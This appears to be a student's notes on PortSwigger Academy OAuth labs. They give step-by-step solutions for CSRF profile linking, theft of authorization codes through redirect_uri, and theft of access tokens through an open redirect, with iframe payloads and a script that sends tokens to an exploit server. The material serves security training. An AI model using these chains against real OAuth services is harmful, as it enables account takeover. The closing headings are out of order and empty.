
https://portswigger.net/web-security/oauth#what-is-oauth

## 1. Forced OAuth profile linking
This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:
- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

**Analysis:**
1. While proxying traffic through Burp, click "My account". You are taken to a normal login page, but notice that there is an option to log in using your social media profile instead. For now, just log in to the blog website directly using the classic login form.
2. Notice that you have the option to attach your social media profile to your existing account.
3. Click "Attach a social profile". You are redirected to the social media website, where you should log in using your social media credentials to complete the OAuth flow. Afterwards, you will be redirected back to the blog website.
4. Log out and then click "My account" to go back to the login page. This time, choose the "Log in with social media" option. Observe that you are logged in instantly via your newly linked social media account.
5. In the proxy history, study the series of requests for attaching a social profile. In the `GET /auth?client_id[...]` request, observe that the `redirect_uri` for this functionality sends the authorization code to `/oauth-linking`. Importantly, notice that the request does not include a `state` parameter to protect against CSRF attacks.
6. Turn on proxy interception and select the "Attach a social profile" option again.
7. Go to Burp Proxy and forward any requests until you have intercepted the one for `GET /oauth-linking?code=[...]`. Right-click on this request and select "Copy URL".
8. Drop the request. This is important to ensure that the code is not used and, therefore, remains valid.
9. Turn off proxy interception and log out of the blog website.
10. Go to the exploit server and create an `iframe` in which the `src` attribute points to the URL you just copied. The result should look something like this:
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`

11. Deliver the exploit to the victim. When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.
12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete `carlos` to solve the lab.

- no state param is implemented, that means that no protection against CSRF is in place
	![](Pasted%20image%2020241215221943.png)

- log out and connect trough social media again but this time intercept proxy and drop the request after a new client code(our code) is received
	![](Pasted%20image%2020241215222155.png)
- deliver the payload using the above URL containing ours client code 
	![](Pasted%20image%2020241215222841.png)

## 2. OAuth account hijacking via redirect_uri
This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. 

You can log in with your own social media account using the following credentials: `wiener:peter`.

**Analysis**:
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. This should start with `GET /auth?client_id=[...]`. Notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the authorization code in the query string. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the `redirect_uri` without encountering an error. Notice that your input is used to generate the redirect in the response.
5. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following `iframe` at `/exploit`:
    
    `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
7. Store the exploit and click "View exploit". Check that your `iframe` loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
9. Log out of the blog website and then use the stolen code to navigate to:
    
    `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`


## 3. Stealing OAuth access tokens via an open redirect
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

***Note:***
You cannot access the admin's API key by simply logging in to their account on the client application. The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

**Analysis**:
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at `/me` and then uses the data it fetches to log the user in. Send the `GET /me` request to Burp Repeater.
3. Log out of your account and log back in again. From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater.
4. In Repeater, experiment with the `GET /auth?client_id=[...]` request. Observe that you cannot supply an external domain as `redirect_uri` because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the `/../` path traversal sequence.
5. Log out of your account on the blog website and turn on proxy interception in Burp.
6. In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
7. Confirm that the `redirect_uri` parameter is in fact vulnerable to directory traversal by changing it to:
    `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
    Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.
8. With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding `GET /post/next?path=[...]` request to Repeater.
9. In Repeater, experiment with the `path` parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
10. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server:
    `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
11. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
12. On the exploit server, create a suitable script at `/exploit` that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:
    `<script> window.location = '/?'+document.location.hash.substr(1) </script>`
13. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for `GET /?access_token=[...]`.
14. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:
    `<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>`
15. To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`.
16. Deliver the exploit to the victim, then copy their access token from the log.
17. In Repeater, go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
18. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.


- initial API get request
  ![](Pasted%20image%2020241216122752.png)
  - initial oauth flow
	![](Pasted%20image%2020241216122828.png)
- testing for redirect (adding /../)
	![](Pasted%20image%2020241216122850.png)

- finding a valid redirect page (next post feature of the blog posts)
	![](Pasted%20image%2020241216122941.png)

- chaining all exploits together (redirect_uri --> our exploit server)
	![](Pasted%20image%2020241216121556.png)

- testing the redirect to the exploit server
	![](Pasted%20image%2020241216121351.png)

- adding payload script for token extraction
	![](Pasted%20image%2020241216121332.png)

- testing the method
	![](Pasted%20image%2020241216121506.png)

- building the final exploit (more details to add)
	![](Pasted%20image%2020241216121933.png)

- testing the final exploit form
	![](Pasted%20image%2020241216122038.png)

- delivering exploit to the victim and capture his token
	![](Pasted%20image%2020241216122226.png)

- back to the API request --> inject the extracted token 
	![](Pasted%20image%2020241216122633.png)
### Script
If the hash is not present:
- The browser is redirected (`window.location`) to an OAuth authentication endpoint. This URL includes various parameters that are critical for the OAuth flow:
    - `client_id=YOUR-LAB-CLIENT-ID`: Identifies the client requesting authentication.
    - `redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/`: Specifies where the OAuth server should redirect the user after authentication. Here, it is set to a URL containing an additional path manipulation (likely for exploit purposes).
    - `response_type=token`: Indicates that the OAuth server should return an access token directly in the URL fragment.
    - `nonce=399721827`: A unique value to prevent replay attacks.
    - `scope=openid profile email`: Specifies the requested scopes, such as OpenID, profile information, and email.

If the hash is present:
- The code redirects the browser to a new URL that appends the hash fragment (excluding the `#`) as a query string parameter.
- `document.location.hash.substr(1)`:
    - `.hash.substr(1)` removes the leading `#` from the hash value.
    - For example, if the hash is `#access_token=abc123`, this will result in `access_token=abc123`.
- The resulting redirection might look like `/?access_token=abc123`.

#### **Purpose**
- **Without a hash**: Redirects the user to an OAuth authentication server to obtain an access token.
- **With a hash**: Appends the hash data to the new URL as a query parameter, likely to process the token or other hash fragment data on the server side.

**Potential Exploitation**
- The `redirect_uri` appears to include a path manipulation (`../`) to redirect the user to a malicious or unexpected URL. This could be used for:
    - **Open Redirect Exploit**: Redirecting the user to an untrusted domain.
    - **Token Hijacking**: Redirecting the access token to an attacker's server (`YOUR-EXPLOIT-SERVER-ID.exploit-server.net`).


## 5. OAuth account hijacking via redirect_uri


## 4. SSRF via OpenID dynamic client registration



